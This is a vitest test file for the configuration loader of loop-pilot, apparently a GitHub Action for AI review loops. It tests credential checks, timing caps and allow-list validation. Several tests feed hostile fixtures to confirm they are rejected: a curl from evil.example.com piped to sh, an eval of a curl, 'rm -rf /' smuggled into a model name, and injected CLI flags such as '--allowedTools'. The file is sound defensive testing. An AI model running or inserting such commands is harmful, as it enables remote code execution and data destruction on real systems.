import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { loadConfig, loadInitConfig } from "../src/config.js";

/**
 * `loadConfig` reads from `core.getInput()` (INPUT_<NAME>) first and falls
 * back to `process.env[<NAME>]`. The tests below drive it via plain env vars
 * — vitest does not seed `INPUT_<NAME>`, so `getInput` returns "" and the
 * fallback path is exercised.
 */

const REQUIRED_ENV: Record<string, string> = {
  GITHUB_REPOSITORY: "edereship/loop-pilot",
  GITHUB_TOKEN: "github-token",
  PR_NUMBER: "99",
};

function withEnv(extra: Record<string, string | undefined>): () => void {
  const previous: Record<string, string | undefined> = {};
  for (const [key, value] of Object.entries(extra)) {
    previous[key] = process.env[key];
    if (value === undefined) {
      delete process.env[key];
    } else {
      process.env[key] = value;
    }
  }
  return () => {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }
  };
}

describe("loadConfig — Claude authentication (TY-260)", () => {
  let restore: (() => void) | null = null;

  beforeEach(() => {
    restore = withEnv({
      ...REQUIRED_ENV,
      ANTHROPIC_API_KEY: undefined,
      CLAUDE_CODE_OAUTH_TOKEN: undefined,
    });
  });

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("accepts ANTHROPIC_API_KEY alone and leaves the OAuth slot empty", () => {
    process.env.ANTHROPIC_API_KEY = "sk-ant-test";

    const config = loadConfig();

    expect(config.anthropicApiKey).toBe("sk-ant-test");
    expect(config.claudeCodeOauthToken).toBe("");
  });

  it("accepts CLAUDE_CODE_OAUTH_TOKEN alone and leaves the API key slot empty", () => {
    process.env.CLAUDE_CODE_OAUTH_TOKEN = "oauth-test";

    const config = loadConfig();

    expect(config.anthropicApiKey).toBe("");
    expect(config.claudeCodeOauthToken).toBe("oauth-test");
  });

  it("fails fast when neither credential is set (cost-mistake guard)", () => {
    expect(() => loadConfig()).toThrow(
      /Set ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN/,
    );
  });

  it("fails fast when both credentials are set (cost-mistake guard)", () => {
    process.env.ANTHROPIC_API_KEY = "sk-ant-test";
    process.env.CLAUDE_CODE_OAUTH_TOKEN = "oauth-test";

    expect(() => loadConfig()).toThrow(
      /Set exactly one of ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN, not both/,
    );
  });

  it("loadInitConfig omits Claude credential fields entirely (TY-267 #10)", () => {
    const config = loadInitConfig();

    // BaseConfig has no Anthropic credentials at the type level, so the
    // runtime object should not carry them either. Init / post-fix consumers
    // that try to read these are flagged at compile time.
    expect("anthropicApiKey" in config).toBe(false);
    expect("claudeCodeOauthToken" in config).toBe(false);
  });
});

describe("loadInitConfig — integer input range validation (TY-267 #15)", () => {
  let restore: (() => void) | null = null;

  beforeEach(() => {
    restore = withEnv({
      ...REQUIRED_ENV,
      MAX_REVIEW_ITERATIONS: undefined,
      DEBOUNCE_SECONDS: undefined,
      STABILIZE_INTERVAL_SECONDS: undefined,
      STABILIZE_COUNT: undefined,
      LOOPPILOT_AUTO_MERGE: undefined,
      LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES: undefined,
      LOOPPILOT_AUTO_MERGE_POLL_SECONDS: undefined,
    });
  });

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("rejects MAX_REVIEW_ITERATIONS=0 with a fail-fast error", () => {
    process.env.MAX_REVIEW_ITERATIONS = "0";
    expect(() => loadInitConfig()).toThrow(
      /max-review-iterations.*must be >= 1, got: 0/,
    );
  });

  it("rejects negative MAX_REVIEW_ITERATIONS", () => {
    process.env.MAX_REVIEW_ITERATIONS = "-3";
    expect(() => loadInitConfig()).toThrow(/must be >= 1, got: -3/);
  });

  it("accepts MAX_REVIEW_ITERATIONS=1 (boundary)", () => {
    process.env.MAX_REVIEW_ITERATIONS = "1";
    expect(loadInitConfig().maxReviewIterations).toBe(1);
  });

  it("rejects negative DEBOUNCE_SECONDS but accepts 0", () => {
    process.env.DEBOUNCE_SECONDS = "-1";
    expect(() => loadInitConfig()).toThrow(/must be >= 0/);
    process.env.DEBOUNCE_SECONDS = "0";
    expect(loadInitConfig().debounceSeconds).toBe(0);
  });

  it("rejects STABILIZE_INTERVAL_SECONDS=0", () => {
    process.env.STABILIZE_INTERVAL_SECONDS = "0";
    expect(() => loadInitConfig()).toThrow(/stabilize-interval-seconds.*must be >= 1/);
  });

  it("rejects STABILIZE_COUNT=0", () => {
    process.env.STABILIZE_COUNT = "0";
    expect(() => loadInitConfig()).toThrow(/stabilize-count.*must be >= 1/);
  });

  // TY-357: individual upper-bound caps (TY-331/TY-333). loop-pilot's intInput
  // gained the `max` arg in TY-334 but these four call sites never received the
  // PoC's caps, so an oversized value could sleep past the 30-min job timeout →
  // cancel → wedge (and a spurious "⚠️ crashed" #2B notice). Lock each cap.
  it("TY-331: rejects DEBOUNCE_SECONDS above the 600s cap", () => {
    process.env.DEBOUNCE_SECONDS = "601";
    expect(() => loadInitConfig()).toThrow(/debounce-seconds.*must be <= 600/);
  });

  it("TY-331: accepts DEBOUNCE_SECONDS exactly at the 600s cap", () => {
    process.env.DEBOUNCE_SECONDS = "600";
    expect(loadInitConfig().debounceSeconds).toBe(600);
  });

  it("TY-331: rejects STABILIZE_INTERVAL_SECONDS above the 300s cap", () => {
    process.env.STABILIZE_INTERVAL_SECONDS = "301";
    expect(() => loadInitConfig()).toThrow(/stabilize-interval-seconds.*must be <= 300/);
  });

  it("TY-333: rejects LOOPPILOT_AUTO_MERGE_POLL_SECONDS above the 300s cap", () => {
    process.env.LOOPPILOT_AUTO_MERGE_POLL_SECONDS = "301";
    expect(() => loadInitConfig()).toThrow(/auto-merge-poll-seconds.*must be <= 300/);
  });

  it("TY-333: rejects LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES above the 25min cap", () => {
    process.env.LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES = "26";
    expect(() => loadInitConfig()).toThrow(/auto-merge-timeout-minutes.*must be <= 25/);
  });

  // TY-336: STABILIZE_COUNT had no upper bound, so a large count reached the
  // same job-timeout wedge TY-331 closed via the interval/debounce caps — the
  // stabilization window is interval × count (consumed even on a successful
  // early-break). Guard the product, not just the individual values.
  it("TY-336 #A: rejects a STABILIZE_COUNT large enough to exceed the window cap", () => {
    process.env.STABILIZE_COUNT = "200"; // 200 × 10 (default interval) = 2000s
    expect(() => loadInitConfig()).toThrow(
      /STABILIZE_INTERVAL_SECONDS × STABILIZE_COUNT .*= 2000s\) must be <= 900s/,
    );
  });

  it("TY-336 #B: rejects an interval × count product over the cap", () => {
    process.env.STABILIZE_INTERVAL_SECONDS = "300";
    process.env.STABILIZE_COUNT = "10"; // 300 × 10 = 3000s
    expect(() => loadInitConfig()).toThrow(/= 3000s\) must be <= 900s/);
  });

  it("TY-336 #C: accepts the default window (10 × 3 = 30s)", () => {
    const config = loadInitConfig();
    expect(config.stabilizeIntervalSeconds).toBe(10);
    expect(config.stabilizeCount).toBe(3);
  });

  it("TY-336: accepts the product exactly at the 900s cap (300 × 3)", () => {
    process.env.STABILIZE_INTERVAL_SECONDS = "300";
    process.env.STABILIZE_COUNT = "3"; // 300 × 3 = 900s (boundary)
    const config = loadInitConfig();
    expect(config.stabilizeIntervalSeconds).toBe(300);
    expect(config.stabilizeCount).toBe(3);
  });

  // BUG-1 (TY-331 follow-up): DEBOUNCE_SECONDS and
  // LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES are each capped in isolation, but on the
  // done/no_findings branch they run back-to-back in the same 30-min job
  // (debounce, worst case 2×, then the auto-merge CI wait). Their individual
  // maxima sum to 2×600 + 25×60 = 2700s, so a slow auto-merge would be cancelled
  // mid-poll and trip the "Auto-review crashed" fail-safe on an already-done PR.
  // The combined budget must be validated when auto-merge is on.
  it("BUG-1: rejects DEBOUNCE_SECONDS + auto-merge timeout that together exceed the job budget", () => {
    process.env.LOOPPILOT_AUTO_MERGE = "true";
    process.env.DEBOUNCE_SECONDS = "600";
    process.env.LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES = "25";
    expect(() => loadInitConfig()).toThrow(
      /2 × 600 \+ 25 × 60 = 2700s\) must be <= 1500s when LOOPPILOT_AUTO_MERGE is enabled/,
    );
  });

  it("BUG-1: allows the same large values when auto-merge is disabled (the wait never runs)", () => {
    process.env.LOOPPILOT_AUTO_MERGE = "false";
    process.env.DEBOUNCE_SECONDS = "600";
    process.env.LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES = "25";
    const config = loadInitConfig();
    expect(config.debounceSeconds).toBe(600);
    expect(config.autoMergeTimeoutMinutes).toBe(25);
  });

  it("BUG-1: accepts an auto-merge config whose combined budget fits (boundary 1500s)", () => {
    process.env.LOOPPILOT_AUTO_MERGE = "true";
    process.env.DEBOUNCE_SECONDS = "150"; // 2×150 = 300
    process.env.LOOPPILOT_AUTO_MERGE_TIMEOUT_MINUTES = "20"; // 1200; total 1500 (== budget)
    const config = loadInitConfig();
    expect(config.autoMergeOnClean).toBe(true);
    expect(config.debounceSeconds).toBe(150);
    expect(config.autoMergeTimeoutMinutes).toBe(20);
  });

  it("BUG-1: accepts the defaults with auto-merge enabled", () => {
    process.env.LOOPPILOT_AUTO_MERGE = "true";
    const config = loadInitConfig();
    expect(config.autoMergeOnClean).toBe(true);
    expect(config.debounceSeconds).toBe(90);
    expect(config.autoMergeTimeoutMinutes).toBe(10);
  });
});

describe("loadBaseConfig — auto-retry-escalate (ES-496)", () => {
  let restore: (() => void) | null = null;

  beforeEach(() => {
    restore = withEnv({
      ...REQUIRED_ENV,
      LOOPPILOT_AUTO_RETRY_ESCALATE: undefined,
    });
  });

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("defaults autoRetryEscalateMaxTurns to false when unset", () => {
    expect(loadInitConfig().autoRetryEscalateMaxTurns).toBe(false);
  });

  it("reads LOOPPILOT_AUTO_RETRY_ESCALATE=true", () => {
    process.env.LOOPPILOT_AUTO_RETRY_ESCALATE = "true";
    expect(loadInitConfig().autoRetryEscalateMaxTurns).toBe(true);
  });

  it("reads LOOPPILOT_AUTO_RETRY_ESCALATE=false", () => {
    process.env.LOOPPILOT_AUTO_RETRY_ESCALATE = "false";
    expect(loadInitConfig().autoRetryEscalateMaxTurns).toBe(false);
  });

  it("rejects a non-boolean LOOPPILOT_AUTO_RETRY_ESCALATE", () => {
    process.env.LOOPPILOT_AUTO_RETRY_ESCALATE = "yes";
    expect(() => loadInitConfig()).toThrow(
      /auto-retry-escalate.*must be 'true' or 'false', got: yes/,
    );
  });
});

describe("loadBaseConfig — severityThreshold (TY-256 / TY-326 #1)", () => {
  let restore: (() => void) | null = null;

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("defaults to P3 when unset (pins the doc-comment to the implementation)", () => {
    restore = withEnv({ ...REQUIRED_ENV, LOOPPILOT_SEVERITY_THRESHOLD: undefined });
    expect(loadInitConfig().severityThreshold).toBe("P3");
  });

  it("falls back to P3 on an invalid value", () => {
    restore = withEnv({ ...REQUIRED_ENV, LOOPPILOT_SEVERITY_THRESHOLD: "P9" });
    expect(loadInitConfig().severityThreshold).toBe("P3");
  });

  it("honours an explicit valid threshold", () => {
    restore = withEnv({ ...REQUIRED_ENV, LOOPPILOT_SEVERITY_THRESHOLD: "P1" });
    expect(loadInitConfig().severityThreshold).toBe("P1");
  });
});

describe("intInput — full-match validation (TY-326 #4)", () => {
  let restore: (() => void) | null = null;

  beforeEach(() => {
    restore = withEnv({ ...REQUIRED_ENV, MAX_REVIEW_ITERATIONS: undefined });
  });

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("rejects trailing garbage instead of silently truncating", () => {
    process.env.MAX_REVIEW_ITERATIONS = "20abc";
    expect(() => loadInitConfig()).toThrow(/must be an integer, got: 20abc/);
  });

  it("rejects a decimal instead of flooring it", () => {
    process.env.MAX_REVIEW_ITERATIONS = "2.5";
    expect(() => loadInitConfig()).toThrow(/must be an integer, got: 2\.5/);
  });

  it("accepts a clean integer (and surrounding whitespace)", () => {
    process.env.MAX_REVIEW_ITERATIONS = " 20 ";
    expect(loadInitConfig().maxReviewIterations).toBe(20);
  });
});

describe("loadInitConfig — scope policy env-var fallback", () => {
  let restore: (() => void) | null = null;

  beforeEach(() => {
    restore = withEnv({
      ...REQUIRED_ENV,
      LOOPPILOT_BLOCK_PATHS: undefined,
      LOOPPILOT_SCOPE_MAX_FILES: undefined,
      LOOPPILOT_SCOPE_MAX_LINES: undefined,
    });
  });

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("falls back to default sentinel values when no variables are set", () => {
    const config = loadInitConfig();
    expect(config.autoReviewBlockPaths).toBe("");
    expect(config.scopeMaxFiles).toBe(0);
    expect(config.scopeMaxLines).toBe(0);
  });

  it("reads LOOPPILOT_SCOPE_MAX_FILES / _MAX_LINES from env when input is empty", () => {
    process.env.LOOPPILOT_SCOPE_MAX_FILES = "5";
    process.env.LOOPPILOT_SCOPE_MAX_LINES = "250";

    const config = loadInitConfig();

    // Empty action input must not shadow Repository variable. Previously the
    // action default of "0" leaked into core.getInput and prevented this
    // env-var override from being seen.
    expect(config.scopeMaxFiles).toBe(5);
    expect(config.scopeMaxLines).toBe(250);
  });

  it("reads the LOOPPILOT_BLOCK_PATHS spec verbatim (TY-271)", () => {
    process.env.LOOPPILOT_BLOCK_PATHS = "secrets/,!Makefile,Justfile";

    const config = loadInitConfig();

    // The raw spec is forwarded as-is; `parseBlockPathsSpec` interprets it
    // in scope-checker. Storing the raw string keeps the config layer free
    // of parsing concerns and lets main-post-fix re-emit it in the warning
    // for `!.github/...` rejections.
    expect(config.autoReviewBlockPaths).toBe("secrets/,!Makefile,Justfile");
  });
});

describe("loadInitConfig — codex ACK polling (TY-334)", () => {
  let restore: (() => void) | null = null;

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("defaults to 90s timeout / 15s interval / 2 reposts", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CODEX_ACK_TIMEOUT_SECONDS: undefined,
      CODEX_ACK_POLL_INTERVAL_SECONDS: undefined,
      CODEX_ACK_MAX_REPOSTS: undefined,
    });
    const config = loadInitConfig();
    expect(config.codexAckTimeoutSeconds).toBe(90);
    expect(config.codexAckPollIntervalSeconds).toBe(15);
    expect(config.codexAckMaxReposts).toBe(2);
  });

  it("allows 0 timeout to disable ACK polling", () => {
    restore = withEnv({ ...REQUIRED_ENV, CODEX_ACK_TIMEOUT_SECONDS: "0" });
    expect(loadInitConfig().codexAckTimeoutSeconds).toBe(0);
  });

  it("rejects a timeout above the job-budget cap (120s)", () => {
    restore = withEnv({ ...REQUIRED_ENV, CODEX_ACK_TIMEOUT_SECONDS: "600" });
    expect(() => loadInitConfig()).toThrow(/must be <= 120/);
  });

  it("rejects more than 3 reposts", () => {
    restore = withEnv({ ...REQUIRED_ENV, CODEX_ACK_MAX_REPOSTS: "10" });
    expect(() => loadInitConfig()).toThrow(/must be <= 3/);
  });
});

describe("loadInitConfig — CHECK_COMMAND validation (TY-274 #2)", () => {
  let restore: (() => void) | null = null;

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("accepts the default `npm run check` command", () => {
    restore = withEnv({ ...REQUIRED_ENV });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("accepts a non-default allow-listed command (e.g. `pytest -xvs`)", () => {
    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "pytest -xvs" });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("rejects a CHECK_COMMAND with shell metacharacters at config load time (fail fast)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CHECK_COMMAND: "npm run check && curl evil.example.com | sh",
    });
    expect(() => loadInitConfig()).toThrow(
      /CHECK_COMMAND .* was rejected by check-command-allowlist/,
    );
  });

  it("rejects a CHECK_COMMAND whose first token is off-allowlist (e.g. `bash`)", () => {
    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "bash do-things.sh" });
    expect(() => loadInitConfig()).toThrow(
      /binary 'bash' is not in the CHECK_COMMAND whitelist/,
    );
  });

  it("rejects an empty CHECK_COMMAND with a fail-fast error", () => {
    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "   " });
    expect(() => loadInitConfig()).toThrow(/empty command/);
  });

  it("surfaces the docs/operations/security.md migration pointer in the error", () => {
    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "eval $(curl …)" });
    expect(() => loadInitConfig()).toThrow(
      /docs\/operations\/security\.md \(CHECK_COMMAND validation\)/,
    );
  });
});

describe("loadInitConfig — BUILD_COMMAND validation (TY-289 #2)", () => {
  let restore: (() => void) | null = null;

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("accepts an empty BUILD_COMMAND (default: skip) without throwing", () => {
    // BUILD_COMMAND is opt-in (TY-281). Empty default must remain a no-op so
    // repos that do not commit build artifacts are unaffected by the new
    // validation layer.
    restore = withEnv({ ...REQUIRED_ENV });
    expect(() => loadInitConfig()).not.toThrow();
    const config = loadInitConfig();
    expect(config.buildCommand).toBe("");
  });

  it("accepts an allow-listed BUILD_COMMAND (e.g. `npm run bundle`)", () => {
    restore = withEnv({ ...REQUIRED_ENV, BUILD_COMMAND: "npm run bundle" });
    expect(() => loadInitConfig()).not.toThrow();
    const config = loadInitConfig();
    expect(config.buildCommand).toBe("npm run bundle");
  });

  it("rejects a BUILD_COMMAND with shell metacharacters at config load time (fail fast)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      BUILD_COMMAND: "npm run bundle && curl evil.example.com | sh",
    });
    expect(() => loadInitConfig()).toThrow(
      /BUILD_COMMAND .* was rejected by check-command-allowlist/,
    );
  });

  it("rejects a BUILD_COMMAND whose first token is off-allowlist (e.g. `bash`)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      BUILD_COMMAND: "bash build.sh",
    });
    expect(() => loadInitConfig()).toThrow(
      /binary 'bash' is not in the CHECK_COMMAND whitelist/,
    );
  });

  it("surfaces the docs/operations/security.md pointer and the npm script wrap guidance in the error", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      BUILD_COMMAND: "npm run bundle && npm run post-process",
    });
    expect(() => loadInitConfig()).toThrow(
      /docs\/operations\/security\.md \(CHECK_COMMAND validation\)/,
    );
    expect(() => loadInitConfig()).toThrow(
      /package\.json script or Makefile target/,
    );
  });
});

describe("loadInitConfig — Claude model name validation (TY-275 #1)", () => {
  let restore: (() => void) | null = null;

  afterEach(() => {
    restore?.();
    restore = null;
  });

  it("accepts the default model identifiers", () => {
    restore = withEnv({ ...REQUIRED_ENV });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("accepts versioned model identifiers (claude-3-5-sonnet-20240620)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-3-5-sonnet-20240620",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  // Codex review on PR #95 (r3257188567): the original whitelist
  // `[A-Za-z0-9._\-]+` was over-restrictive and rejected legitimate
  // provider-form identifiers. The relaxed forbidden-char regex now
  // accepts them while still blocking whitespace / quote injection.
  it("accepts Bedrock ARN-style model identifiers (TY-275 #1 follow-up)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE:
        "bedrock/anthropic.claude-3-5-sonnet-20241022-v2:0",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("accepts Vertex-AI-style @date model identifiers (TY-275 #1 follow-up)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-3-5-sonnet@20240620",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("accepts context-window variant identifiers (claude-opus-4-7:1m, TY-275 #1 follow-up)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-opus-4-7:1m",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("accepts bracket-suffix context variants (claude-opus-4-7[1m], TY-275 #1 follow-up)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-opus-4-7[1m]",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("rejects CLAUDE_CODE_MODEL_BASE with embedded space + flag (argv injection guard)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-sonnet-4-6 --max-turns 999",
    });
    expect(() => loadInitConfig()).toThrow(
      /CLAUDE_CODE_MODEL_BASE.*whitespace, quotes, or shell metacharacters/,
    );
  });

  it("rejects CLAUDE_CODE_MODEL_ESCALATED with shell metacharacters", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_ESCALATED: "claude-opus-4-7; rm -rf /",
    });
    expect(() => loadInitConfig()).toThrow(
      /CLAUDE_CODE_MODEL_ESCALATED.*whitespace, quotes, or shell metacharacters/,
    );
  });

  it("rejects quoted model identifiers (argv quote-escape guard)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: 'claude-opus-4-7"',
    });
    expect(() => loadInitConfig()).toThrow(
      /CLAUDE_CODE_MODEL_BASE.*rejected.*not contain whitespace, quotes, or shell metacharacters/,
    );
  });

  it("rejects leading `-` model identifiers (Codex r3257717904 — flag-injection guard)", () => {
    // Without this guard, an attacker setting
    // CLAUDE_CODE_MODEL_BASE="--allowedTools" would interpolate as
    // `--model --allowedTools` and re-interpret the value as a fresh CLI
    // flag, achieving argv injection without using whitespace. No
    // legitimate model identifier starts with `-`.
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "--allowedTools",
    });
    expect(() => loadInitConfig()).toThrow(
      /CLAUDE_CODE_MODEL_BASE.*must not start with `-`/,
    );
  });

  it("rejects single-dash leading model identifiers (Codex r3257717904)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_ESCALATED: "-model-with-dash",
    });
    expect(() => loadInitConfig()).toThrow(
      /CLAUDE_CODE_MODEL_ESCALATED.*must not start with `-`/,
    );
  });

  it("accepts `#` mid-identifier (Codex r3258007797 — false positive rebuttal)", () => {
    // Codex flagged `#` as if it were rejected, but the forbidden-char regex
    // intentionally does NOT include `#`: Bash treats `#` as comment only at
    // the start of a word, and when interpolated as `--model <value>` the
    // `#` is mid-token. This regression test pins the current permissive
    // behavior so a future tightening of the regex does not silently break
    // it.
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "claude-opus-4-7#variant",
    });
    expect(() => loadInitConfig()).not.toThrow();
  });

  it("falls back to default for empty CLAUDE_CODE_MODEL_BASE (no error)", () => {
    restore = withEnv({
      ...REQUIRED_ENV,
      CLAUDE_CODE_MODEL_BASE: "",
    });
    // Empty string causes `input()` to fall back to the default, which is
    // a valid identifier; loadConfig should accept it without throwing.
    expect(() => loadInitConfig()).not.toThrow();
  });
});
